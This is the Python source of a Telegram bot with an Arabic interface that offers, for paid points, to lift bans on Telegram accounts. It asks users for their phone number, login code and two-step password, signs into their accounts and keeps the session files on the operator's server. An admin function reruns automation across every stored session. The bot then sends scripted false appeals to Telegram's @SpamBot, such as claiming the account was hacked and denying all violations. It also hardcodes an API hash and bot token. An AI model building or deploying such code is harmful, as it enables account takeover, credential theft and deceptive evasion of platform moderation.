import asyncio
import os
import glob
import sqlite3
import zipfile
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import RPCError, SessionPasswordNeeded, MessageNotModified, UserNotParticipant

# ثوابت التطبيق والبوت
API_ID = 29594386
API_HASH = "a9cd8f55c3df945f1b311b75dcddc248"
BOT_TOKEN = "8514323886:AAGP1GhnD5o46vqny5E46pfCEQTNnTnXVC0"
ADMIN_ID = 8672319029  # أيدي المطور الأساسي

# تحقق من إعدادات API قبل تشغيل البوت
if ":" in API_HASH or len(API_HASH) != 32:
    raise ValueError(
        "API_HASH غير صحيح. تأكد من وضع قيمة api_hash الخاصة بحساب Telegram وليس توكن البوت."
    )

# بدء الموكل (Client)
bot = Client("control_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# إعداد قاعدة البيانات لإدارة نقاط المستخدمين
conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, points INTEGER)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS system_stats (key TEXT PRIMARY KEY, value INTEGER)''')
conn.commit()

def increment_stat(key):
    cursor.execute("INSERT OR IGNORE INTO system_stats (key, value) VALUES (?, 0)", (key,))
    cursor.execute("UPDATE system_stats SET value = value + 1 WHERE key = ?", (key,))
    conn.commit()

def get_stat(key):
    cursor.execute("SELECT value FROM system_stats WHERE key = ?", (key,))
    row = cursor.fetchone()
    return row[0] if row else 0

def get_points(user_id):
    cursor.execute("SELECT points FROM users WHERE user_id=?", (user_id,))
    res = cursor.fetchone()
    if res:
        return res[0]
    cursor.execute("INSERT INTO users (user_id, points) VALUES (?, ?)", (user_id, 0))
    conn.commit()
    return 0

def add_points(user_id, points):
    current = get_points(user_id)
    cursor.execute("UPDATE users SET points=? WHERE user_id=?", (current + points, user_id))
    conn.commit()

def get_user_count():
    cursor.execute("SELECT COUNT(*) FROM users")
    return cursor.fetchone()[0]

# قاموس لحفظ حالة استلام الإدخال لكل مستخدم
user_states = {}

async def wait_for_user_input(user_id, input_type, prompt_message: str):
    await bot.send_message(user_id, prompt_message)
    user_states[user_id] = {"type": input_type, "value": None}
    
    while user_id in user_states and user_states[user_id]["value"] is None:
        await asyncio.sleep(1)
        
    if user_id not in user_states:
        return None  # تم مسح الحالة
        
    val = user_states[user_id]["value"]
    del user_states[user_id]
    return val

@bot.on_message(filters.private & filters.text & ~filters.regex(r'^/'))
async def capture_user_input(client: Client, message):
    user_id = message.from_user.id
    if user_id not in user_states:
        return

    user_states[user_id]["value"] = message.text.strip()
    await message.reply("✅ تم استلام النص. جاري المتابعة...")

async def safe_edit_text(message, text, reply_markup=None):
    try:
        await message.edit_text(text, reply_markup=reply_markup)
    except MessageNotModified:
        pass

# دالة توليد الأزرار للمستخدم (تمت إضافة زر فك الحظر العام)
def get_main_keyboard(user_id):
    board = [
        [
            InlineKeyboardButton("📢 قناة التفعيلات", url="https://t.me/zzxvzvx"),
            InlineKeyboardButton("🔄 تغيير الرقم", callback_data="change_number")
        ],
        [
            InlineKeyboardButton("🔐 فك التقييد (تجميد)", callback_data="login_account"),
            InlineKeyboardButton("🔓 فك الحظر العام", callback_data="unban_general")
        ],
        [
            InlineKeyboardButton("🛒 شراء نقاط", url="t.me/znxvzc"),
            InlineKeyboardButton("👨‍💻 المطور", url="t.me/znxvzc")
        ],
        [
            InlineKeyboardButton("🔙 العودة للقائمة", callback_data="main_menu")
        ]
    ]
    if user_id == ADMIN_ID:
        board.append([InlineKeyboardButton("⚙️ لوحة الإدارة (للمطور)", callback_data="admin_panel")])
    return InlineKeyboardMarkup(board)


@bot.on_message(filters.private & filters.command("start"))
async def start_cmd(client: Client, message):
    user_id = message.from_user.id
    points = get_points(user_id)
    text = (
        f"أهلاً بك في بوت الخدمات 🛡\n\n"
        f"💰 إجمالي نقاطك: **{points}** نقطة\n"
        f"🔹 يمكنك فك تقييد حسابات التيليجرام وفك الحظر العام آلياً.\n\n"
        f"✳️ استخدم الأزرار أدناه للوصول السريع لكل خدمة."
    )
    await message.reply(text, reply_markup=get_main_keyboard(user_id))

# (بقيه الأكواد السابقة مثل add_points_cmd و handle_zip_sessions تبقى كما هي...)

@bot.on_callback_query()
async def callback_handler(client: Client, query: CallbackQuery):
    try: await query.answer()
    except: pass

    user_id = query.from_user.id
    data = query.data
    
    # معالجة زر "فك التقييد" وزر "فك الحظر العام" بنفس المنطق
    if data in ["login_account", "unban_general"]:
        points = get_points(user_id)
        cost = 10 
        
        if points < cost and user_id != ADMIN_ID:
            await query.answer("❌ النقاط غير كافيه (تحتاج 10 نقاط)", show_alert=True)
            return
            
        await query.message.reply("سيتم بدء عملية تسجيل الدخول للرقم..\nأرسل /start للإلغاء.")
        if not os.path.exists("sessions"): os.makedirs("sessions")
            
        phone = await wait_for_user_input(user_id, "phone", "📞 أرسل رقم الهاتف (مثال: +2012...):")
        if not phone: return
        
        session_name = phone.replace("+", "")
        app = Client(session_name, api_id=API_ID, api_hash=API_HASH, workdir="sessions")
        await app.connect()
        
        login_success = False
        try:
            sent_code = await app.send_code(phone)
            code = await wait_for_user_input(user_id, "code", "✉️ أرسل كود التحقق الواصل لك:")
            if not code: return
            
            try:
                await app.sign_in(phone, sent_code.phone_code_hash, code)
            except SessionPasswordNeeded:
                password = await wait_for_user_input(user_id, "password", "🔑 أرسل كلمة مرور التحقق بخطوتين:")
                if not password: return
                await app.check_password(password)
                
            if user_id != ADMIN_ID:
                add_points(user_id, -cost)
            
            await bot.send_message(user_id, f"✅ تم الدخول! جاري الآن التواصل مع @SpamBot...")
            login_success = True
        except Exception as e:
            await bot.send_message(user_id, f"❌ خطأ: {e}")
        finally:
            if getattr(app, "is_connected", False): await app.disconnect()
                
        if login_success:
            increment_stat("logged_in_accounts")
            asyncio.create_task(run_process_session_background(session_name, user_id))

    # (بقية الـ elif للمينيو والادمن تبقى كما هي في ملفك الأصلي...)
    elif data == "admin_panel":
        if user_id != ADMIN_ID:
            await query.answer("❌ هذه الوظيفة خاصة بالمطور فقط.", show_alert=True)
            return
        stats = (
            f"⚙️ لوحة التحكم الخاصة بالمطور:\n"
            f"- المستخدمين المسجلين: {get_user_count()}\n"
            f"- حسابات تم فكها بنجاح: {get_stat('unbanned')}\n"
            f"- محاولات فاشلة: {get_stat('failed')}\n"
            f"- إجمالي الجلسات المحفوظة: {len(glob.glob('sessions/*.session'))}\n"
        )
        await safe_edit_text(query.message, stats, InlineKeyboardMarkup([
            [InlineKeyboardButton("تشغيل المعالجة لجميع الجلسات 🚀", callback_data="admin_run_all")],
            [InlineKeyboardButton("إرسال نقاط لمستخدم 🎁", callback_data="admin_add_points")],
            [InlineKeyboardButton("إذاعة رسالة للمستخدمين 📢", callback_data="admin_broadcast")],
            [InlineKeyboardButton("العودة للقائمة 🔙", callback_data="main_menu")]
        ]))

    elif data == "admin_run_all":
        if user_id != ADMIN_ID:
            await query.answer("❌ هذه الوظيفة خاصة بالمطور فقط.", show_alert=True)
            return
        session_files = glob.glob('sessions/*.session')
        if not session_files:
            await query.answer('⚠️ لا توجد جلسات محفوظة للتشغيل.', show_alert=True)
            return
        for session_path in session_files:
            session_name = os.path.basename(session_path).replace('.session', '')
            asyncio.create_task(run_process_session_background(session_name, user_id))
        await query.answer(f'🚀 تم بدء معالجة {len(session_files)} جلسة.', show_alert=True)
        return

    elif data == "admin_broadcast":
        if user_id != ADMIN_ID:
            await query.answer("❌ هذه الوظيفة خاصة بالمطور فقط.", show_alert=True)
            return
        prompt = (
            "📣 أرسل لي نص الرسالة التي تريد إذاعتها لجميع المستخدمين.\n"
            "يمكنك كتابة نص واحد فقط وسأرسله لكل مستخدم مسجل."
        )
        broadcast_text = await wait_for_user_input(user_id, "admin_broadcast", prompt)
        if not broadcast_text:
            return
        cursor.execute("SELECT user_id FROM users")
        users = cursor.fetchall()
        success = 0
        for row in users:
            try:
                await bot.send_message(row[0], broadcast_text)
                success += 1
            except Exception:
                continue
        await bot.send_message(user_id, f"✅ تم إرسال الرسالة إلى {success} مستخدمين.")
        return

    elif data == "admin_add_points":
        if user_id != ADMIN_ID:
            await query.answer("❌ هذه الوظيفة خاصة بالمطور فقط.", show_alert=True)
            return

        prompt = (
            "📥 أرسل الآن آيدي المستخدم في رسالة واحدة،\n"
            "ثم أرسل عدد النقاط في رسالة منفصلة." 
        )
        target_id_str = await wait_for_user_input(user_id, "admin_add_points_id", prompt)
        if not target_id_str:
            return

        if not target_id_str.isdigit():
            await bot.send_message(user_id, "❌ الآيدي غير صحيح. أرسل رقم آيدي المستخدم فقط.")
            return

        target_id = int(target_id_str)
        points_str = await wait_for_user_input(user_id, "admin_add_points_amount", "📥 الآن أرسل عدد النقاط المراد إضافتها:")
        if not points_str:
            return

        if not points_str.lstrip('-').isdigit():
            await bot.send_message(user_id, "❌ عدد النقاط غير صحيح. أرسل قيمة رقمية.")
            return

        amount = int(points_str)
        add_points(target_id, amount)
        await bot.send_message(user_id, f"✅ تم إضافة {amount} نقطة للمستخدم {target_id}.")
        try:
            current_points = get_points(target_id)
            await bot.send_message(
                target_id,
                f"🎉 تم إضافة {amount} نقطة إلى حسابك من المطور.\n💰 رصيدك الآن: {current_points} نقطة."
            )
        except Exception:
            await bot.send_message(user_id, f"⚠️ تم إضافة النقاط ولكن لم أتمكن من إرسال إشعار للمستخدم {target_id}.")
        return

    elif data == "main_menu":
        points = get_points(user_id)
        await safe_edit_text(query.message, f"أهلاً بك مجدداً 🛡\n💰 نقاطك: **{points}**", get_main_keyboard(user_id))

# مُنظم التشغيل
CONCURRENCY_LIMIT = 50
session_semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)

async def run_process_session_background(session_name: str, user_id: int):
    async with session_semaphore:
        await asyncio.sleep(1)
        session_path = f"sessions/{session_name}.session"
        app = Client(session_name, api_id=API_ID, api_hash=API_HASH, workdir="sessions")
        await process_session(app, session_path, user_id)

async def process_session(app: Client, session_path: str, request_user_id: int):
    session_name = os.path.basename(session_path).replace(".session", "")
    try:
        await app.start()
        await app.send_message("SpamBot", "/start")
        previous_text = ""
        
        while getattr(app, "is_connected", False):
            await asyncio.sleep(3)
            async for msg in app.get_chat_history("SpamBot", limit=1):
                if not msg.text or msg.from_user.is_self: continue
                text = msg.text
                if text == previous_text: continue
                previous_text = text
                
                # دالة ضغط الأزرار المحسنة
                async def click_button(*kws):
                    if not hasattr(msg, "reply_markup") or not msg.reply_markup:
                        return False
                    if hasattr(msg.reply_markup, "inline_keyboard") and msg.reply_markup.inline_keyboard:
                        for row in msg.reply_markup.inline_keyboard:
                            for btn in row:
                                btn_text = btn.text if hasattr(btn, "text") else btn if isinstance(btn, str) else None
                                if not btn_text:
                                    continue
                                if not kws or any(k.lower() in btn_text.lower() for k in kws):
                                    if getattr(btn, "callback_data", None):
                                        try:
                                            await app.send_callback_query(msg.chat.id, msg.id, btn.callback_data)
                                            return True
                                        except Exception:
                                            pass
                                    await app.send_message("SpamBot", btn_text)
                                    return True
                        # fallback: if requested yes and there are yes/no buttons, choose the top button
                        if kws and kws[0].lower() == "yes":
                            first_btn = msg.reply_markup.inline_keyboard[0][0]
                            btn_text = first_btn.text if hasattr(first_btn, "text") else first_btn if isinstance(first_btn, str) else None
                            if btn_text:
                                if getattr(first_btn, "callback_data", None):
                                    try:
                                        await app.send_callback_query(msg.chat.id, msg.id, first_btn.callback_data)
                                        return True
                                    except Exception:
                                        pass
                                await app.send_message("SpamBot", btn_text)
                                return True
                    if hasattr(msg.reply_markup, "keyboard") and msg.reply_markup.keyboard:
                        for row in msg.reply_markup.keyboard:
                            for btn in row:
                                btn_text = btn.text if hasattr(btn, "text") else btn if isinstance(btn, str) else None
                                if not btn_text:
                                    continue
                                if not kws or any(k.lower() in btn_text.lower() for k in kws):
                                    await app.send_message("SpamBot", btn_text)
                                    return True
                    return False

                # منطق الردود بناءً على البرومبت الجديد
                if "your account was blocked" in text.lower() and "telegram terms of service" in text.lower():
                    await app.send_message("SpamBot", "My account was hacked")

                elif "i'm very sorry" in text.lower() or "some actions can trigger a harsh response" in text.lower():
                    if not await click_button("this is a mistake", "This is a mistake"):
                        await app.send_message("SpamBot", "This is a mistake")

                elif "submit a complaint" in text.lower() or "would you like to submit" in text.lower():
                    if not await click_button("yes"):
                        await app.send_message("SpamBot", "Yes")

                elif "did you ever do any of this" in text.lower():
                    if not await click_button("no", "never"):
                        await app.send_message("SpamBot", "No! Never did that!")

                elif "please verify you are a human" in text.lower():
                    await bot.send_message(request_user_id, f"⚠️ الرقم {session_name} يحتاج التحقق البشري في @SpamBot.\nارجو فتح المحادثة والتأكد أنك لست روبوت ثم اضغط DONE.")

                elif "great! i’m very sorry" in text.lower() or "why do you think your account was limited" in text.lower():
                    await app.send_message("SpamBot", "My Telegram account was compromised recently. Any messages sent during that period were not sent by me. Access has now been fully restored. Please disregard any previous messages. Thank you for your understanding")

                elif "please enter your full legal name" in text:
                    await app.send_message("SpamBot", "My Telegram account was compromised recently. Any messages sent during that period were not sent by me. Access has now been fully restored. Please disregard any previous messages. Thank you for your understanding")

                elif "Please enter your full legal name" in text:
                    full_name = await wait_for_user_input(request_user_id, "spambot_full_name", "✍️ اكتب الاسم الثلاثي بالكامل الآن:")
                    if full_name:
                        await app.send_message("SpamBot", full_name)

                elif "Please enter your contact email" in text:
                    email = await wait_for_user_input(request_user_id, "spambot_contact_email", "📧 أرسل البريد الإلكتروني المرتبط بالحساب:")
                    if email:
                        await app.send_message("SpamBot", email)

                elif "Approximately, what year did you sign up for Telegram with this account" in text:
                    year = await wait_for_user_input(request_user_id, "spambot_signup_year", "🗓 أرسل تقريباً سنة إنشاء الحساب:")
                    if year:
                        await app.send_message("SpamBot", year)

                elif "Please provide a brief general description" in text:
                    await app.send_message("SpamBot", "friend")

                elif "Please send me a text message" in text:
                    await app.send_message("SpamBot", "My Telegram account was compromised recently. Any messages sent during that period were not sent by me. Access has now been fully restored. Please disregard any previous messages. Thank you for your understanding")

                elif "Please briefly describe your average daily use of Telegram" in text:
                    await app.send_message("SpamBot", "I use Telegram on a daily basis to communicate with my friends and stay in touch with them")

                elif "By submitting this appeal" in text:
                    if not await click_button("Confirm"):
                        await app.send_message("SpamBot", "Confirm")

                elif "verify you are a human" in text:
                    await bot.send_message(request_user_id, f"⚠️ الرقم {session_name} يحتاج التحقق البشري. الرجاء فتح الحساب والتأكد أنك لست روبوتاً.")

                elif "Why do you think your account was limited" in text or "write me some details" in text:
                    await app.send_message("SpamBot", "My Telegram account was compromised recently. Any messages sent during that period were not sent by me. Access has now been fully restored. Please disregard any previous messages. Thank you for your understanding")

                elif "successfully submitted" in text or "all limitations will be lifted" in text:
                    increment_stat("unbanned")
                    await bot.send_message(request_user_id, f"✅ تم تقديم الطلب بنجاح للرقم {session_name}!\nسيتم فك الحظر خلال ساعات إن شاء الله.")
                    return

                elif "Good news" in text or "limitations have been removed" in text:
                    increment_stat("unbanned")
                    await bot.send_message(request_user_id, f"🎉 مبروك! الرقم {session_name} تم فك حظره تماماً.")
                    return

                elif "Unfortunately" in text:
                    increment_stat("failed")
                    await bot.send_message(request_user_id, f"❌ للأسف الرقم {session_name} رفضت الشركة فكه.")
                    return
        
    except Exception as e:
        await bot.send_message(request_user_id, f"❌ خطأ في {session_name}: {str(e)}")
    finally:
        if getattr(app, "is_connected", False): await app.stop()

if __name__ == "__main__":
    print("Bot is running...")
    bot.run()
